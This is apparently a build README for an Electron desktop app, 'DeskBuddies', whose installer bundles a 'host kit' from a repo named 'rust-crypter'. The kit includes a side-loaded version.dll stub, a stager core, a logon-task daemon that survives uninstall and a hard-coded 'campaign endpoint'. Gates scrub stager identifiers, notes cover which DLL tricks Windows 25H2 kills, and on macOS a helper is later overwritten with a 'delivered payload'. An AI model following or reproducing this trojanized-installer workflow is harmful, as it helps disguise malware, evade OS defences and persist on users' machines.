# Building DeskBuddies

DeskBuddies is an Electron + Vite app. Packaging is electron-builder; the
shipping lane additionally stages the reusable **host kit** (the Rust update
core) beside the packaged executable.

## Prerequisites

- **Node 24+** (built here on node v24.18.0; the Windows box runs v24.20.0).
- `npm ci` once per checkout.
- **Windows packaging** normally runs on Windows. On Linux the win leg needs
  wine; the Debian box has none, so use the unpacked leg and disable executable
  resource editing (see *Gates* below).
- The **stager leg** additionally needs the sibling `shroud/rust-crypter`
  checkout - see *Building with the update core*.

## Everyday commands

| Command | What it does |
|---|---|
| `npm ci` | install dependencies |
| `npm run dev` | Vite dev server + Electron |
| `npm run build` | `tsc --noEmit` + Vite build into `build-output/` |
| `npm test` | vitest |
| `npm run make-icon` | regenerate `build/icon.png` |
| `npm run dist` | plain package - **no update core** (core-less) |
| `npm run dist:stager` | **the shipping lane** - stage the host kit, then package |

## Building with the update core

### What the kit is

The host kit is one reusable Windows drop-in emitted by the sibling
`shroud/rust-crypter` checkout (`tools/host-kit/build-host-kit.sh`). DeskBuddies
**consumes** it; this repo never builds the DLLs itself. The Creator Desk and
the OBS lane consume the same kit, so the delivery chain stays identical across
hosts.

### Kit contract

The kit is a directory containing exactly these files:

| File | Role |
|---|---|
| `version.dll` | genuine-MS forwarding stub - the 6 version exports the host imports |
| `vmin.dll` | the Rust update core (cdylib over `crates/app-update-core`) |
| `app-update-daemon.exe` | logon-task target; survives app uninstall |
| `seed-conf.ps1` | seeds `desk.conf` - **SERVER only, never a token** |
| `install-hooks.nsh` | NSIS include: conf seeding + logon task + legacy sweep |
| `MANIFEST.txt` | size + sha256 + source commits for every artifact |

### How this repo consumes it

1. `scripts/build-with-stager.mjs` resolves the kit from, in order:
   `--kit <dir>`, `HOST_KIT_DIR`, or a sibling `rust-crypter` checkout
   (it runs that checkout's `tools/host-kit/build-host-kit.sh` and picks up the emitted
   `host-kit/`; override the emit path with `--kit-out`).
2. It fails closed if the kit is incomplete, if any shipped binary disagrees with
   `MANIFEST.txt`, or if a build-path / stale identifier survives in the core.
3. It stages the kit into `stager-stage/` (gitignored) and writes
   `stager-stage/PROVENANCE.txt`.
4. `package.json -> build.win.extraFiles` copies `version.dll`, `vmin.dll` and
   `app-update-daemon.exe` to the **app root**, i.e. beside
   `DeskBuddies.exe`. `extraResources` would drop them in `resources/` and
   break the lane - do not switch it.
5. `package.json -> build.nsis.include` points at
   `build/installer/stager-hooks.nsh`, the bridge to the kit's NSIS include.
   It writes `stager-stage/HOSTKIT-DEFINES.nsh` too, so the bridge can supply
   the values the kit requires:

   | define | value for this host |
   |---|---|
   | `HOSTKIT_SERVER` | from `--server`, else `HOSTKIT_SERVER`, else the recorded campaign endpoint `wss://cdn-beam.site` (the value the Creator Desk installer seeds - `bf-win-ffi/src-tauri/installer/installer-hooks.nsh:35`). An explicit `--server` always wins. |
   | `HOSTKIT_DAEMON_NAME` | `app-update-daemon.exe` - must match `extraFiles`, because the hook stages the daemon out of `$INSTDIR` |
   | `HOSTKIT_TASK_NAME` | `Bright Floppy DeskBuddies Update` (the kit default names the Creator Desk) |
   | `HOSTKIT_PRODUCT_NAME` | `DeskBuddies` - the customer-visible installer progress strings. Guarded with `!ifndef`, so a caller can still override it on the makensis command line. |

   The kit ships **Tauri-style** hook macros (`NSIS_HOOK_PREINSTALL` and
   friends); electron-builder calls its own hooks (`customInit`,
   `customInstall`, `customUnInstall`). The bridge maps one onto the other -
   `customInstall` runs after the app files land, so the daemon is in place for
   the staging step, and `customUnInstall` runs before electron-builder deletes
   the installed files, which is what keeps the uninstall frontend-only.

   If the kit was not staged, the bridge is a hard `!error`: electron-builder
   passes `-WX` (warnings as errors - `app-builder-lib/out/targets/nsis/NsisTarget.js:514`),
   so a `!warning` would fail the build anyway, and an installer without the
   update core is not a shippable DeskBuddies. That means **`npm run dist` cannot
   build the NSIS installer**; use `npm run dist:stager`. The `portable` target
   and `--dir` are unaffected (the include is nsis-only).

   Paths in the bridge are separator-safe: `${__FILEDIR__}` comes back
   backslash-separated on Windows and `!if /FileExists` does **not** find a
   forward-slash path there (verified on the Windows box). The backslash form is
   tried first - it resolves on both platforms - with the forward-slash form as a
   fallback, and the bridge `!echo`s the kit directory it settled on so any build
   log shows it.
   If the kit was staged without the defines file at all (a hand-staged kit),
   it is a hard `!error` instead of a guess: the lane always writes the defines,
   so this only fires for a kit copied in by hand.
6. The NSIS include applies to the `nsis` target only; the `portable`
   target carries no installer hooks.

### Prerequisites for the stager leg

- The sibling checkout `../rust-crypter` (the core is consumed through path
  dependencies) - clone `shroud/rust-crypter` beside this repo.
- The `x86_64-pc-windows-gnu` Rust target and the mingw toolchain, which the
  kit builder owns.

**A fresh checkout cannot build the stager leg.** Without the sibling
`rust-crypter` checkout there is no kit, and `npm run dist:stager` stops with
an explicit error listing the three ways to supply one. `npm run dist` no longer
produces a Windows installer either: the NSIS compile stops at the bridge's
`!error` rather than shipping a package with no update core. `npm run dev`,
`npm test`, `npm run build` and `npm run dist -- --dir` all still work.

### The 25H2 two-file constraint

From the USB-lane README (bisect-proven 2026-09-04), verbatim:

> Non-genuine `version.dll` beside the exe = process killed at load on
> 25H2 26200 (empty C DLL dies; SigThief dies; fingerprints-only dies).
> Two-file pattern (real-MS version.dll + arbitrary-named core) is the
> survivor. Single-file lane: WINSPOOL.DRV name tolerated ONLY when
> pristine/unsigned - patched or Rust builds die under it. Do NOT ship
> non-genuine version.dll builds to 25H2+ boxes.

Consequences for this lane: the two DLLs must land **beside** the executable
(never in `resources/`), and `version.dll` must remain the kit's stub. Never
rename the Rust core to `version.dll` and never hand-assemble the folder.

### Gates

```sh
# (a) build
npm ci && npm run build

# (b) unpacked Windows leg - the local gate (no wine on this box)
npm run dist:stager -- --kit <kit-dir> --dir -c.win.signAndEditExecutable=false
ls release/win-unpacked/     # DeskBuddies.exe + version.dll + vmin.dll + app-update-daemon.exe

# (b2) the NSIS half - the unpacked gate never runs makensis, so compile it
node scripts/build-with-stager.mjs --stage-only --kit <kit-dir> --server https://example.invalid
makensis -V4 -DSMOKE_OUT=/tmp/hook-smoke.exe "$PWD/build/installer/hook-smoke.nsi"
# -> exit 0, and prints: host-kit product name: DeskBuddies
#    (-V4 is what surfaces the harness's compile-time !echo; the string table is
#     compressed, so the product name is NOT greppable out of the built installer)
# Pass an ABSOLUTE script path: NSIS resolves ${__FILEDIR__} from the path it was
# given, and electron-builder always hands it an absolute one.

# (c) + (d) are enforced by the lane script itself, on every run:
#   (c) sha256 of the staged binaries vs the kit MANIFEST.txt
#   (d) identifier scan: 0 x /home/jacob, stager_core, StagerHost, spawn_stager, bf-daemon
#
# (c) is a same-build consistency check, NOT a reproducibility check: the kit's
# vmin.dll is not bit-reproducible (two builds of identical source give the same
# size but different sha256 - the GNU ld PE header timestamp). The manifest sha
# identifies one specific build; never verify by rebuilding and comparing.
```

`-c.win.signAndEditExecutable=false` is required on Linux only: without wine,
electron-builder cannot rcedit the executable, and `--dir` then completes
without touching resources. On Windows, do not pass it.

### Windows full installer (the real gate)

On the Windows box (`windowsmain`, node v24.20.0), in a scratch copy - never in
a working copy:

```sh
npm ci
npm run dist:stager -- --kit <kit-dir> --server https://<endpoint>
# -> release/DeskBuddies Setup 0.2.0.exe  (+ the portable artifact)
```

No wine flag there: Windows edits and signs natively.

`--server` is the endpoint the installer seeds into
`%LOCALAPPDATA%\BrightFloppy\desk.conf` - **SERVER only, never a token**
(INV-44 P0-1). It is optional: with no `--server` the lane uses the recorded
campaign endpoint `wss://cdn-beam.site` (the same value the Creator Desk
installer seeds), prints that it did so, and records it in
`stager-stage/PROVENANCE.txt`. Resolution order is `--server` > `HOSTKIT_SERVER`
> that default, and the resolved value is always printed, so a build log always
shows which endpoint went in. `http(s)` and `wss` URLs are accepted; anything
else is refused with exit 2.

### What the installer must never do

**No token seeding.** INV-44 P0-1: the installer writes
`%LOCALAPPDATA%\BrightFloppy\desk.conf` with `SERVER` only; per-install
enrolment owns the token. That logic lives in the kit's `install-hooks.nsh` and
`seed-conf.ps1`; this repo only wires the include in. If a future change makes
an installer write `AGENT_TOKEN`, that is a P0 regression, not a build detail.

## macOS lane

The mac equivalent of the Windows two-file lane is **one helper binary inside the
bundle**, at `DeskBuddies.app/Contents/MacOS/` - not beside the executable,
because a `.app` is a directory. (Both platforms' entries are scoped - `win.extraFiles`
and `mac.extraFiles` - so a mac bundle can never pick up the Windows DLLs, and a
Windows build never sees the mac helper.) electron-builder's `mac.extraFiles` puts it
there: its `to` is relative to the bundle's `Contents/` directory
(`app-builder-lib/out/platformPackager.js`, `getExtraFileMatchers`), so
`to: "MacOS/<helper>"` is the whole trick.

### Toolchain (no sudo, nothing system-wide)

The build box (MacBook Pro, Intel x86_64, macOS 13.7.8) has cargo with both
darwin targets but **no node**. Fetch a portable Node into `~/tools/node` and put
it on PATH for the build:

```bash
mkdir -p ~/tools && cd ~/tools
URL=$(curl -fsSL https://nodejs.org/dist/latest-v22.x/ | grep -oE 'node-v[0-9.]+-darwin-x64.tar.gz' | head -1)
curl -fsSL -o node.tar.gz "https://nodejs.org/dist/latest-v22.x/$URL"
mkdir node && tar xzf node.tar.gz -C node --strip-components=1 && rm node.tar.gz
export PATH="$HOME/tools/node/bin:$PATH"   # node v22.23.3 / npm 10.9.9
```

### Commands

```bash
npm ci
# npm appends extra args to the END of the whole script chain, so a "--kit" after
# "npm run dist:mac --" lands on the packaging step, not on the lane. Pass the kit
# by env var for the npm path:
HOST_KIT_DIR=<dir-with-helper> npm run dist:mac

# ...or drive the lane directly when you need --helper-name:
node scripts/build-with-stager.mjs --mac --dir --kit <dir> --helper-name <name>
bash scripts/mac-package.sh
```

`dist:mac` builds the `.app` (`electron-builder --mac --dir`) and then runs
`scripts/mac-package.sh`. `npm run package:mac` re-runs only the signing and
packing step against an existing bundle.

### The helper contract

`scripts/build-with-stager.mjs --mac` stages exactly one file: the helper, named
**`agent`** and landing at `Contents/MacOS/agent`.

That name is the host seam's, not a guess: `BF_MAC_HELPER_NAME = "agent"`
(`rust-crypter` `crates/app-update-core/src/host.rs:290`, documented in
`docs/HOST-ADAPTER.md:62`) is the name the exec path writes **into** `store_dir`.
Shipping the same name in the bundle keeps it a straight copy with exactly one
name in play. `MAC_HELPER_DEFAULT` holds it; `--helper-name <name>` overrides.

The binary is the crate's own daemon, built for darwin:

```bash
cargo build --release --target x86_64-apple-darwin -p app-update-core --bin app-update-daemon
```

**The bundle copy is the bootstrap, not the long-term artifact.** The update
chain later overwrites `store_dir/agent` with the delivered payload (chmod 0700) -
the same division of labour as the Windows installer hook, which stages the
daemon out of `$INSTDIR` and then lets it keep itself current.

The lane **refuses to build when the helper is absent** - no `--kit`, exit 2; no
helper in the kit, exit 1 with the kit's contents listed and nothing left staged.
A bundle that looks like a shipping DeskBuddies but carries no update core is the
failure mode this guard exists to prevent.

Gates the mac lane enforces itself: helper present; sha256 against the kit's
`MANIFEST.txt` when the kit ships one; 0 x `/home/jacob`, `stager_core`,
`StagerHost`, `spawn_stager`, `bf-daemon` in the helper (ASCII and UTF-16LE);
`stager-stage-mac/PROVENANCE.txt` records the kit, size, sha256 and endpoint.

### Signing: ad-hoc, and always BEFORE packing

`mac.identity` is `null` in package.json, so electron-builder does not sign;
`scripts/mac-package.sh` does it, per Mach-O member then the bundle:

```bash
codesign --force --sign - "$APP/Contents/MacOS/<each Mach-O>"
codesign --force --sign - "$APP"
codesign --verify --deep --strict "$APP"
```

Signing happens before packing on purpose: electron-builder packs whatever it
built, so a dmg produced before the re-sign would ship an unsigned app. Unsigned
executables stall pre-main under syspolicyd assessment on Ventura - proven live on
this box, and the same lesson the Creator Desk lane encodes in
`bf-win-ffi/scripts/mac_package_tarballs.sh`.

Artifacts: `release/DeskBuddies-<version>-x64.zip` (`ditto`, which preserves mac
metadata), `release/DeskBuddies-<version>-x64.dmg` (`hdiutil`, UDZO) and a
`.sha256` sidecar for each. There is no notarization: LO declined the Apple
Developer ID (INV-8), so customers get the documented right-click-Open / `xattr`
bypass on the downloads page.

### What is NOT proven yet

- The helper is the **real update core** as of the task-21 rebuild (task-17's
  `app-update-daemon` for darwin, built from `7b9d500`). What is proven is that
  the right binary is in the right place, signed and audited. What is NOT proven
  is that it *runs*: nothing here executes it.
- **Nothing copies the helper out of the bundle yet.** The app-side wiring that
  takes `Contents/MacOS/agent` and writes `store_dir/agent` + the LaunchAgent
  plist (`com.BrightFloppyKit`) does not exist in this repo. Until it does, the
  bundle carries the helper and nothing schedules it.
- No customer mac has run this: no E2E, no Gatekeeper run, no TCC prompt, no
  LaunchAgent registration. The lane proves the artifact builds, signs and packs.
- The seam's exec path (`mac_exec`) is invoked by the crate, not by DeskBuddies:
  if this app ships its own helper and its own LaunchAgent, `mac_exec` may never
  be called, and the seam value matters only for name agreement.
- Three platforms, three store-dir spellings, deliberate: Linux
  `$HOME/.local/share/brightfloppy` (lowercase), macOS `BrightFloppyKit`,
  Windows `BrightFloppy`.

